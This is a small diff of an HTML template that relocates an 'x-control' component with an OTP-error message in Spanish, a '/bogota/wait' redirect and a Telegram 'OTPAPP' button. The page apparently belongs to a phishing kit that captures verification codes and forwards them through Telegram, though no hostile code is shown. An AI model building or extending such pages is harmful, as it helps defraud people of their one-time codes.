@@ -12,6 +12,9 @@
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.3.0/font/bootstrap-icons.css">
     <script src="https://code.jquery.com/jquery-3.7.1.min.js"
         integrity="sha256-/JqT3SQfawRcv/BIHPThkBvs0OEvtFFmqPF/lYI/Cxo=" crossorigin="anonymous"></script>
+    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
+        toast-message="Código de verificación incorrecto o vencido. Ingresa un nuevo código de verificación"
+        telegram-button="OTPAPP" />
     <style>
         @font-face {
             font-family: Roboto-Light;
@@ -199,11 +202,6 @@
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
         integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL"
         crossorigin="anonymous"></script>
-
-    <x-control :auto-completar="false" :debug="false" redirect-url="/bogota/wait"
-        toast-message="Código de verificación incorrecto o vencida. Ingresa una nuevo código de verificación"
-        telegram-button="OTPAPP"
-    />
 </body>
 
 </html>
